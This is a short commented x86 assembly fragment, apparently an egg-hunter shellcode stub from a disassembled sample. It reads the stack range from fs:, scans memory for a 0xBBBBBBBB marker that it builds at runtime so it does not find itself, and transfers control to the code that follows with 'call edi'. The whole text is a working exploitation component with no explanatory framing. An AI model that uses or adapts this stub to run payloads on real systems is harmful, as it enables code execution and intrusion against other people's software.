mov ecx,dword ptr fs:[eax]               ; the end of the stack
add eax,4
mov edi,dword ptr fs:[eax]               ; the beginning of the stack
sub ecx,edi                              ; Getting the size
mov eax,BBBBBBBC                         ; not BB to not find itself by wrong
dec eax                                  ; became == 0xBBBBBBBB
repne scas byte ptr es:[edi]
cmp dword ptr [edi-1],eax
jnz short Shellcod.00401015
add edi,3
call edi


